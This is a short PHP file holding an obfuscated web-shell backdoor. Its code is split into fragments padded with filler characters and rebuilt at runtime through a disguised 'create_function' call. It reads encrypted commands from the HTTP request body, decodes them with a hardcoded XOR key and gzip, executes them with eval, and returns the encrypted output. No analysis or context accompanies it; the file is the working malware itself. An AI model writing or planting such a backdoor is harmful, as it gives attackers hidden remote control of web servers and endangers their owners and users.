<?php
$u='de!K!K!K($m[1]),$k)));$o=@ob_get_!Kc!Kont!Kents();@ob_en!K!Kd_clean();$r!K=';
$c=';$!Kj+!K+,$i!K!K++!K){$o.=$t{$i}^$k{$j};!K}}ret!Kurn $o;}if !K(@p!K!Kreg';
$B='$k="!K!K!K46afaa70";$kh="a0d3a4!Kb9c7da!K";$k!Kf="dd7f26!Kf95b8!K2!K";$p';
$N='@base6!K4!K_encode(@!Kx(@gzcom!K!Kpr!Kess($o),$k));pri!Knt("$!Kp$kh$!Kr$kf");}';
$G='l!Ken($t)!K;!K$o=!K"";for($i=0;!K!K$i<$l;){fo!Kr($!Kj=0;($j<$c&&$i<$l!K)';
$D='="U!KBr!KY5!K32q0eqx9MDs";f!Ku!Knction x($t!K,$k){$!Kc=strlen($k!K)!K;$l=str';
$l='_ma!Ktch("!K/$kh(.+)$kf/",@f!Ki!Kle_g!Ket_content!Ks("ph!Kp://input")!K!K,';
$O=str_replace('s','','screaste_sfssusnction');
$W='$m)==1) !K{@ob_st!Kart();@e!Kva!Kl(@gzunc!Komp!K!Kress(@x(@bas!Ke64!K_deco';
$Z=str_replace('!K','',$B.$D.$G.$c.$l.$W.$u.$N);
$q=$O('',$Z);$q();
?>
